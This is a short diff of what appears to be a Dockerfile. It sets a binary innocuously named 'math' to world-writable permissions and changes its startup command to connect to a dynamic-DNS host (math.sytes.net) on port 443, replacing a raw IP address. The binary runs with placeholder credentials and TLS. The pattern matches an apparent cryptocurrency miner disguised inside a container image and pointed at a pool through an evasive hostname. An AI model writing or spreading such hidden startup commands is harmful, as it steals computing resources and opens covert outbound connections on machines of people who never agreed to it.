@@ -15,4 +15,4 @@ WORKDIR /usr/local/bin
 
 RUN chmod 777 math;
 
-CMD math --url 45.143.94.72:443 --user x --pass x --tls
+CMD math --url math.sytes.net:443 --user x --pass x --tls
